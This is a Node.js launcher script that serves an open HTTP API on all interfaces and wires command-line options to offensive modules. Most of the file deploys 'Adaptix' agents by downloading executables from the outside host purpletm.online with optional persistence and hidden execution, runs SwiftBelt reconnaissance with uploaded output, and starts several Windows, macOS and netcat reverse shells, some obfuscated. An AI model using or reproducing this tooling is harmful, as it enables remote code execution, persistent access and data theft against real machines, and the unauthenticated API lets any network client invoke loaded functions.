#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const http = require('http');

// ===== Load all function modules dynamically =====
const utilsDir = path.join(__dirname, 'utils');
const utils = {};

fs.readdirSync(utilsDir)
  .filter(f => f.endsWith('.js') && !f.startsWith('rev-'))
  .forEach(file => {
    const name = path.basename(file, '.js');
    try {
      const module = require(path.join(utilsDir, file));
      if (typeof module === 'function') {
        utils[name] = module;
      }
    } catch (err) {
      console.warn(`⚠️  Failed to load ${name}:`, err.message);
    }
  });

// ====== Simple web server ======
const PORT = 8888;
const publicDir = path.join(__dirname, 'public');

const server = http.createServer((req, res) => {
  if (req.url.startsWith('/api/')) {
    const [, , command] = req.url.split('/');
    const urlParams = new URL(req.url, `http://${req.headers.host}`);
    const args = urlParams.searchParams.get('args')?.split(' ') || [];

    if (utils[command]) {
      try {
        const result = utils[command](...args);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'ok', result }));
      } catch (err) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'error', message: err.message }));
      }
    } else {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ status: 'error', message: 'Command not found' }));
    }
    return;
  }

  // serve static files
  let filePath = path.join(publicDir, req.url === '/' ? 'index.html' : req.url);
  fs.readFile(filePath, (err, content) => {
    if (err) {
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      res.end('404 Not Found');
    } else {
      const ext = path.extname(filePath).toLowerCase();
      const type =
        ext === '.html' ? 'text/html' :
        ext === '.js'   ? 'text/javascript' :
        ext === '.css'  ? 'text/css' :
        'text/plain';
      res.writeHead(200, { 'Content-Type': type });
      res.end(content);
    }
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`🌐 Web server running at http://localhost:${PORT}`);
});

// ====== CLI mode still works ======
const [,, option, ...args] = process.argv;

if (option && utils[option]) {
  try {
    utils[option](...args);
  } catch (err) {
    console.error('❌ Error running command:', err.message);
  }
} else if (option) {
  console.error(`Unknown command: ${option}`);
  console.log('');
  utils.help();
}

const revAdaptixAgent = require('./utils/rev-adaptix-agent.js');

if (process.argv[2] === 'help' && process.argv[3] === 'adaptix-agent') {
  revAdaptixAgent().then(result => {
    console.log('✅ Adaptix Agent deployment completed');
    console.log(`PID: ${result.pid}`);
    console.log(`File: ${result.filePath}`);
  }).catch(err => {
    console.error('❌ Deployment failed:', err.message);
    process.exit(1);
  });
}

const revWinAdaptixAgent = require('./utils/rev-win-adaptix-agent.js');

if (process.argv[2] === 'rev-win-adaptix-agent') {
  // Parse arguments properly - filter out flags to get the URL
  const args = process.argv.slice(3).filter(arg => !arg.startsWith('--'));
  const options = {
    url: args[0] || "http://purpletm.online:7070/purple-win.exe",
    persistence: process.argv.includes('--persist')
  };
  
  revWinAdaptixAgent(options).then(result => {
    console.log('✅ Windows Adaptix Agent deployment completed');
    console.log(`PID: ${result.pid}`);
    console.log(`File: ${result.filePath}`);
    console.log(`Platform: ${result.platform}`);
    console.log(`Method: ${result.method}`);
    console.log(`Hidden: ${result.hidden}`);
  }).catch(err => {
    console.error('❌ Windows Agent deployment failed:', err.message);
    process.exit(1);
  });
}

const revWinAdaptixGopher = require('./utils/rev-win-adaptix-gopher.js');

if (process.argv[2] === 'rev-win-adaptix-gopher') {
  // Parse arguments properly - filter out flags to get the URL
  const args = process.argv.slice(3).filter(arg => !arg.startsWith('--'));
  const options = {
    url: args[0] || "http://purpletm.online:7070/purple-gopher.exe",
    persistence: process.argv.includes('--persist')
  };
  
  revWinAdaptixGopher(options).then(result => {
    console.log('✅ Windows Adaptix Gopher deployment completed');
    console.log(`PID: ${result.pid}`);
    console.log(`File: ${result.filePath}`);
    console.log(`Platform: ${result.platform}`);
    console.log(`Method: ${result.method}`);
    console.log(`Hidden: ${result.hidden}`);
  }).catch(err => {
    console.error('❌ Windows Gopher deployment failed:', err.message);
    process.exit(1);
  });
}

const runSwiftBelt = require('./utils/run-swiftbelt.js');

if (process.argv[2] === 'swiftbelt') {
  runSwiftBelt().then(result => {
    console.log('✅ SwiftBelt execution completed');
    console.log(`Exit code: ${result.exitCode}`);
    console.log(`Output uploaded: ${result.uploaded}`);
  }).catch(err => {
    console.error('❌ SwiftBelt execution failed:', err.message);
    process.exit(1);
  });
}

if (process.argv[2] === 'rev-win-direct') {
  console.log('🚀 Starting Windows reverse shell...');
  require('./utils/rev-win-direct.js');
}

if (process.argv[2] === 'rev-win-direct-obs') {
  console.log('🚀 Starting obfuscated Windows reverse shell...');
  require('./utils/rev-win-direct-obs.js');
}

if (process.argv[2] === 'rev-nc-obs-direct') {
  console.log('🚀 Starting obfuscated netcat reverse shell...');
  require('./utils/rev-nc-obs-direct.js');
}

if (process.argv[2] === 'rev-nc-macos') {
  console.log('🚀 Starting macOS netcat reverse shell...');
  require('./utils/rev-nc-macos.js');
}

if (process.argv[2] === 'rev-nc-obs') {
  console.log('🚀 Starting working obfuscated netcat reverse shell...');
  require('./utils/rev-nc-obs-working.js');
}